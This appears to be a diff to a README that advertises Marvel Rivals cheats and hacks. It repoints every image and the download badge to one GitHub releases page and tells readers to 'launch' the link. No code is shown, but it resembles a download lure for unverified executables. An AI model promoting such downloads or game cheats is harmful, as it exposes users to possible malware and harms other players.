@@ -26,13 +26,13 @@ In this repository, you'll find a wide range of cheats and hacks to elevate your
 ## Download Marvel Rivals Cheats
 Ready to take your Marvel Rivals gameplay to the next level? Download the cheats and hacks from the link below:
 
-[![Download Marvel Rivals Cheats](https://img.shields.io/badge/Download-Marvel_Rivals_Cheats-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download Marvel Rivals Cheats](https://github.com/Kimbeerlyn/Marvel-Rivals-Trainer-Cheats/releases)](https://github.com/Kimbeerlyn/Marvel-Rivals-Trainer-Cheats/releases)
 
 Note: The provided link needs to be launched to access the cheats and hacks. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
 ## Marvel Rivals Gameplay 🦸‍♂️
 
-![Marvel Rivals Gameplay](https://source.unsplash.com/featured/?marvel)
+![Marvel Rivals Gameplay](https://github.com/Kimbeerlyn/Marvel-Rivals-Trainer-Cheats/releases)
 
 Marvel Rivals is an action-packed game that pits your favorite Marvel superheroes against each other in exciting battles. With our cheats and hacks, you can outsmart your opponents, improve your aiming skills, and unlock new levels of gameplay.
 
@@ -47,4 +47,4 @@ Ready to dominate Marvel Rivals like never before? Download the cheats, hacks, a
 
 Let the games begin! 💥🎮
 
-![Marvel Rivals Logo](https://img.icons8.com/color/452/marvel.png)
+![Marvel Rivals Logo](https://github.com/Kimbeerlyn/Marvel-Rivals-Trainer-Cheats/releases)
